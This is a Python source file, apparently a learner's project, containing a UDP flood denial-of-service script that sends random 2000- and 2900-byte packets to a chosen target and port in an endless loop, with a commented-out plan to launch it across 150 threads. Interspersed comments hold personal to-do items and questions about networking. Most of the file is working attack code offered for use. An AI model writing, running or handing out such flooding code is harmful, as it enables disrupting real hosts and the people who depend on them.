import os
import platform
import random

# import threading
import socket

# TODO: Read docs on time, os, random, threading, and platform
# TODO: Take questions to Mastodon
# TODO: Eat good food
# TODO: Get plenty of water and sleep


# ANSI colors with proper escape
R = '\033[31m'
G = '\033[32m'
C = '\033[36m'
W = '\033[0m'

# v1: just create ddos script

# Instead of using SOCK_STREAM for TCP connections
# using SOCK_DGRAM for UDP connections to keep packets small
# If iterating on this, will use SOCK_STREAM to send bigger packets if I actually understand
# what that means for the network being hit

# Is there enough precedent with ipv6 addresses to use socket.AF_INET6?
# How would that work?

# TODO: research ipv6

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes1 = random.randbytes(2000)
bytes2 = random.randbytes(2900)
system = platform.uname().system


# this is better system = getattr(platform.uname(), "system")
# instead of hardcoding a specific index
# because if something in the l


def check_os():
    if system == 'Windows':
        os.system("cls")
    elif system == 'Unix':
        os.system("clear")


class DDoS:
    pass

    def __init__(self, target, port, ip):
        self.target = target
        self.port = port
        self.ip = ip


# call function to check what system is used


# Why use a try

def ddos(target, port, ipaddress):
    sent = 0
    try:
        while True:
            sock.sendto(bytes1, (target, port))
            sent = sent + 1

            print("Sending %s packets to %s through port:%s" % (sent, ipaddress, port))
            while True:
                sock.sendto(bytes2, (target, port))
                sent = sent + 1
                print("Sending %s packets to %s through port:%s" % (sent, ipaddress, port))

    # Break out of infinite loop

    except KeyboardInterrupt:
        print('\n' + R + '[!]' + C + 'Keyboard Interrupt. Terminating session...' + W)

    except socket.gaierror:
        print(R + '[-] ' + C + 'Unknown address.')
        print(R + '[-] ' + C + 'Please input the correct ip address.')

    except NameError:
        print(R + '[-] ' + C + 'Unknown address.')
        print(R + '[-] ' + C + 'Please input the correct ip address.')

# For introducing to the script later

# for i in range(150):
#     thread = threading.Thread(target=ddos)
#     thread.start()
